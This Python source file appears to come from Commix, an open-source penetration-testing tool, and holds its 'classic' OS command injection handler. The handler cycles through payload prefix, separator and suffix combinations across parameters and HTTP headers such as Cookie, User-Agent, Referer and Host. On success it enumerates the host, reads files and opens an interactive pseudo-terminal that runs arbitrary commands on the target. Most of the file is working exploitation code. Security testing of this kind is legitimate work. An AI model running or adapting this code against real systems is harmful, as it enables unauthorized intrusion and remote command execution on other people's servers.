#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2022 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""
import re
import os
import sys
import time
import string
import random
from src.thirdparty.six.moves import input as _input
from src.thirdparty.six.moves import urllib as _urllib
from src.thirdparty.six.moves import html_parser as _html_parser
from src.utils import menu
from src.utils import logs
from src.utils import settings
from src.utils import common
from src.utils import session_handler
from src.thirdparty.colorama import Fore, Back, Style, init
from src.core.shells import reverse_tcp
from src.core.requests import headers
from src.core.requests import requests
from src.core.requests import parameters
from src.core.injections.controller import checks
from src.core.injections.controller import shell_options
from src.core.injections.results_based.techniques.classic import cb_injector
from src.core.injections.results_based.techniques.classic import cb_payloads
from src.core.injections.results_based.techniques.classic import cb_enumeration
from src.core.injections.results_based.techniques.classic import cb_file_access
try:
  import html
  unescape = html.unescape
except:  # Python 2
  unescape = _html_parser.HTMLParser().unescape

"""
The "classic" technique on result-based OS command injection.
"""

"""
The "classic" injection technique handler.
"""
def cb_injection_handler(url, timesec, filename, http_request_method, injection_type, technique):
  shell = False
  counter = 1
  vp_flag = True
  no_result = True
  is_encoded = False
  export_injection_info = False

  if not settings.LOAD_SESSION: 
    info_msg = "Testing the " + "(" + injection_type.split(" ")[0] + ") " + technique + ". "
    sys.stdout.write(settings.print_info_msg(info_msg))
    sys.stdout.flush()
    if settings.VERBOSITY_LEVEL != 0:
      print(settings.SINGLE_WHITESPACE)
      
  i = 0
  # Calculate all possible combinations
  total = len(settings.WHITESPACES) * len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES)
  for whitespace in settings.WHITESPACES:
    for prefix in settings.PREFIXES:
      for suffix in settings.SUFFIXES:
        for separator in settings.SEPARATORS:
          if whitespace == " ":
            whitespace = _urllib.parse.quote(whitespace) 
          # Check injection state
          settings.DETECTION_PHASE = True
          settings.EXPLOITATION_PHASE = False
          # If a previous session is available.
          if settings.LOAD_SESSION and session_handler.notification(url, technique, injection_type):
            try:
              settings.CLASSIC_STATE = True
              url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, how_long, output_length, is_vulnerable = session_handler.injection_point_exportation(url, http_request_method)
              checks.check_for_stored_tamper(payload)
            except TypeError:
              err_msg = "An error occurred while accessing session file ('"
              err_msg += settings.SESSION_FILE + "'). "
              err_msg += "Use the '--flush-session' option."
              print(settings.print_critical_msg(err_msg))
              raise SystemExit()

          else:
            i = i + 1
            # Check for bad combination of prefix and separator
            combination = prefix + separator
            if combination in settings.JUNK_COMBINATION:
              prefix = ""

            # Change TAG on every request to prevent false-positive results.
            TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6)) 
            
            randv1 = random.randrange(100)
            randv2 = random.randrange(100)
            randvcalc = randv1 + randv2
            
            # Define alter shell
            alter_shell = menu.options.alter_shell
            
            try:
              if alter_shell:
                # Classic -alter shell- decision payload (check if host is vulnerable).
                payload = cb_payloads.decision_alter_shell(separator, TAG, randv1, randv2)
              else:
                # Classic decision payload (check if host is vulnerable).
                payload = cb_payloads.decision(separator, TAG, randv1, randv2)
              
              # Define prefixes & suffixes
              payload = parameters.prefixes(payload, prefix)
              payload = parameters.suffixes(payload, suffix)

              # Whitespace fixation
              payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)
              
              # Perform payload modification
              payload = checks.perform_payload_modification(payload)

              # Check if defined "--verbose" option.
              if settings.VERBOSITY_LEVEL == 1:
                print(settings.print_payload(payload))
              elif settings.VERBOSITY_LEVEL >= 2:
                debug_msg = "Generating payload for the injection."
                print(settings.print_debug_msg(debug_msg))
                print(settings.print_payload(payload)) 
                
              # Cookie header injection
              if settings.COOKIE_INJECTION == True:
                # Check if target host is vulnerable to cookie header injection.
                vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)
                response = cb_injector.cookie_injection_test(url, vuln_parameter, payload)
                
              # User-Agent HTTP header injection
              elif settings.USER_AGENT_INJECTION == True:
                # Check if target host is vulnerable to user-agent HTTP header injection.
                vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)
                response = cb_injector.user_agent_injection_test(url, vuln_parameter, payload)

              # Referer HTTP header injection
              elif settings.REFERER_INJECTION == True:
                # Check if target host is vulnerable to referer HTTP header injection.
                vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)
                response = cb_injector.referer_injection_test(url, vuln_parameter, payload)

              # Host HTTP header injection
              elif settings.HOST_INJECTION == True:
                # Check if target host is vulnerable to host HTTP header injection.
                vuln_parameter = parameters.specify_host_parameter(menu.options.host)
                response = cb_injector.host_injection_test(url, vuln_parameter, payload)

              # Custom HTTP header Injection
              elif settings.CUSTOM_HEADER_INJECTION == True:
                # Check if target host is vulnerable to custom http header injection.
                vuln_parameter = parameters.specify_custom_header_parameter(settings.INJECT_TAG)
                response = cb_injector.custom_header_injection_test(url, vuln_parameter, payload)

              else:
                # Check if target host is vulnerable.
                response, vuln_parameter = cb_injector.injection_test(payload, http_request_method, url)

              # Try target page reload (if it is required).
              if settings.URL_RELOAD:
                response = requests.url_reload(url, timesec)

              # Evaluate test results.
              time.sleep(timesec)
              shell = cb_injector.injection_test_results(response, TAG, randvcalc)

              if settings.VERBOSITY_LEVEL == 0:
                percent = ((i*100)/total)
                float_percent = "{0:.1f}".format(round(((i*100)/(total*1.0)),2))
              
                if shell == False:
                  info_msg = "Testing the " + "(" + injection_type.split(" ")[0] + ") " + technique + "." +  " (" + str(float_percent) + "%)"
                  sys.stdout.write("\r" + settings.print_info_msg(info_msg))  
                  sys.stdout.flush()

                if float(float_percent) >= 99.9:
                  if no_result == True:
                    percent = settings.FAIL_STATUS
                  else:
                    percent = ".. (" + str(float_percent) + "%)"
                elif len(shell) != 0:
                  percent = settings.info_msg
                else:
                  percent = ".. (" + str(float_percent) + "%)"
                info_msg = "Testing the " + "(" + injection_type.split(" ")[0] + ") " + technique + "." + "" + percent + ""
                sys.stdout.write("\r" + settings.print_info_msg(info_msg))  
                sys.stdout.flush()
            
            except KeyboardInterrupt: 
              raise

            except SystemExit: 
              raise

            except EOFError:
              if not settings.IS_TTY:
                print(settings.SINGLE_WHITESPACE)
              err_msg = "Exiting, due to EOFError."
              print(settings.print_error_msg(err_msg))
              raise 

            except:
              continue
          
          # Yaw, got shellz! 
          # Do some magic tricks!
          if shell:
            found = True
            no_result = False
            # Check injection state
            settings.DETECTION_PHASE = False
            settings.EXPLOITATION_PHASE = True
            if settings.COOKIE_INJECTION == True: 
              header_name = " cookie"
              found_vuln_parameter = vuln_parameter
              the_type = " parameter"

            elif settings.USER_AGENT_INJECTION == True: 
              header_name = " User-Agent"
              found_vuln_parameter = ""
              the_type = " HTTP header"

            elif settings.REFERER_INJECTION == True: 
              header_name = " Referer"
              found_vuln_parameter = ""
              the_type = " HTTP header"

            elif settings.HOST_INJECTION == True: 
              header_name = " Host"
              found_vuln_parameter = ""
              the_type = " HTTP header"

            elif settings.CUSTOM_HEADER_INJECTION == True: 
              header_name = " " + settings.CUSTOM_HEADER_NAME
              found_vuln_parameter = ""
              the_type = " HTTP header"

            else:    
              header_name = ""
              the_type = " parameter"
              # Check if defined POST data
              if not settings.USER_DEFINED_POST_DATA:
                found_vuln_parameter = parameters.vuln_GET_param(url)
              else :
                found_vuln_parameter = vuln_parameter

            if len(found_vuln_parameter) != 0 :
              found_vuln_parameter = " '" +  found_vuln_parameter + Style.RESET_ALL  + Style.BRIGHT + "'" 

            # Print the findings to log file.
            if export_injection_info == False:
              export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)
            if vp_flag == True:
              vp_flag = logs.add_parameter(vp_flag, filename, the_type, header_name, http_request_method, vuln_parameter, payload)
            logs.update_payload(filename, counter, payload) 
            counter = counter + 1

            if not settings.LOAD_SESSION:
              if settings.VERBOSITY_LEVEL == 0:
                print(settings.SINGLE_WHITESPACE)
              else:
                checks.total_of_requests()

            # Print the findings to terminal.
            info_msg = "The"
            if len(found_vuln_parameter) > 0 and not "cookie" in header_name : 
              info_msg += " " + http_request_method + "" 
            info_msg += ('', ' (JSON)')[settings.IS_JSON] + ('', ' (SOAP/XML)')[settings.IS_XML] + the_type + header_name
            info_msg += found_vuln_parameter + " seems injectable via "
            info_msg += "(" + injection_type.split(" ")[0] + ") " + technique + "."
            print(settings.print_bold_info_msg(info_msg))
            sub_content = str(checks.url_decode(payload))
            print(settings.print_sub_content(sub_content))
            # Export session
            if not settings.LOAD_SESSION:
              session_handler.injection_point_importation(url, technique, injection_type, separator, shell[0], vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response=0, timesec=0, how_long=0, output_length=0, is_vulnerable=menu.options.level)
            else:
              whitespace = settings.WHITESPACES[0]
              settings.LOAD_SESSION = False  
            
            # Check for any enumeration options.
            new_line = True
            if settings.ENUMERATION_DONE == True :
              while True:
                message = "Do you want to ignore stored session and enumerate again? [Y/n] > "
                enumerate_again = common.read_input(message, default="Y", check_batch=True)
                if enumerate_again in settings.CHOICE_YES:
                  if not menu.options.ignore_session:
                    menu.options.ignore_session = True
                  cb_enumeration.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
                  break
                elif enumerate_again in settings.CHOICE_NO:
                  new_line = False
                  break
                elif enumerate_again in settings.CHOICE_QUIT:
                  raise SystemExit()
                else:
                  err_msg = "'" + enumerate_again + "' is not a valid answer."  
                  print(settings.print_error_msg(err_msg))
                  pass
            else:
              if menu.enumeration_options():
                cb_enumeration.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
                      
            # Check for any system file access options.
            if settings.FILE_ACCESS_DONE == True :
              while True:
                message = "Do you want to ignore stored session and access files again? [Y/n] > "
                file_access_again = common.read_input(message, default="Y", check_batch=True)
                if file_access_again in settings.CHOICE_YES:
                  if not menu.options.ignore_session:
                    menu.options.ignore_session = True
                  cb_file_access.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
                  break
                elif file_access_again in settings.CHOICE_NO: 
                  break
                elif file_access_again in settings.CHOICE_QUIT:
                  raise SystemExit()
                else:
                  err_msg = "'" + file_access_again  + "' is not a valid answer."  
                  print(settings.print_error_msg(err_msg))
                  pass
            else:
              if menu.file_access_options():
                cb_file_access.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
              
            # Check if defined single cmd.
            if menu.options.os_cmd:
              cb_enumeration.single_os_cmd_exec(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
              
            # Pseudo-Terminal shell
            go_back = False
            go_back_again = False
            while True :
              if go_back == True:
                break 
              message = "The identified injection point has been exploited. Do you want a pseudo-terminal shell? [Y/n] > "
              if settings.IS_TTY:
                gotshell = common.read_input(message, default="Y", check_batch=True)
              else:
                gotshell = common.read_input(message, default="n", check_batch=True)
              if gotshell in settings.CHOICE_YES:
                print("Pseudo-Terminal (type '" + Style.BRIGHT + "?" + Style.RESET_ALL + "' for available options)")
                if settings.READLINE_ERROR:
                  checks.no_readline_module()
                while True:
                  try:
                    if not settings.READLINE_ERROR:
                      checks.tab_autocompleter()
                    sys.stdout.write(settings.OS_SHELL)
                    cmd = common.read_input(message="", default="os_shell", check_batch=True)
                    cmd = checks.escaped_cmd(cmd)
                    if cmd.lower() in settings.SHELL_OPTIONS:
                      go_back, go_back_again = shell_options.check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, go_back, no_result, timesec, go_back_again, payload, OUTPUT_TEXTFILE="")
                      if go_back and go_back_again == False:
                        break
                      if go_back and go_back_again:
                        return True 
                    else:
                      # Command execution results.
                      time.sleep(timesec)
                      response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
                      # Try target page reload (if it is required).
                      if settings.URL_RELOAD:
                        response = requests.url_reload(url, timesec)
                      if menu.options.ignore_session or \
                         session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
                        # Evaluate injection results.
                        try:
                          shell = cb_injector.injection_results(response, TAG, cmd)
                          shell = "".join(str(p) for p in shell)
                        except:
                          print(settings.SINGLE_WHITESPACE)
                          continue  
                        if not menu.options.ignore_session :
                          session_handler.store_cmd(url, cmd, shell, vuln_parameter)
                      else:
                        shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
                      if shell:
                        shell = unescape(shell)
                        # Update logs with executed cmds and execution results.
                        logs.executed_command(filename, cmd, shell)
                      if shell != "":
                        if settings.VERBOSITY_LEVEL <= 1:
                          print(settings.SINGLE_WHITESPACE)
                        print(settings.command_execution_output(shell))
                        print(settings.SINGLE_WHITESPACE)
                      else:
                        if settings.VERBOSITY_LEVEL == 1 or (len(cmd) == 0 and settings.VERBOSITY_LEVEL <= 1):
                          print(settings.SINGLE_WHITESPACE)
                        err_msg = "The '" + cmd + "' command, does not return any output."
                        print(settings.print_critical_msg(err_msg))
                        print(settings.SINGLE_WHITESPACE)

                  except KeyboardInterrupt: 
                    raise
                    
                  except SystemExit: 
                    raise

                  except EOFError:
                    if not settings.IS_TTY:
                      print(settings.SINGLE_WHITESPACE)
                    err_msg = "Exiting, due to EOFError."
                    print(settings.print_error_msg(err_msg))
                    raise 

              elif gotshell in settings.CHOICE_NO:
                if checks.next_attack_vector(technique, go_back) == True:
                  break
                else:
                  if no_result == True:
                    return False 
                  else:
                    return True  

              elif gotshell in settings.CHOICE_QUIT:
                raise SystemExit()

              else:
                err_msg = "'" + gotshell + "' is not a valid answer."
                print(settings.print_error_msg(err_msg))
                pass
                
  if no_result == True:
    if settings.VERBOSITY_LEVEL == 0:
      print(settings.SINGLE_WHITESPACE)
    return False
  else:
    sys.stdout.write("\r")
    sys.stdout.flush()

"""
The exploitation function.
(call the injection handler)
"""
def exploitation(url, timesec, filename, http_request_method, injection_type, technique):
  if cb_injection_handler(url, timesec, filename, http_request_method, injection_type, technique) == False:
    return False

# eof
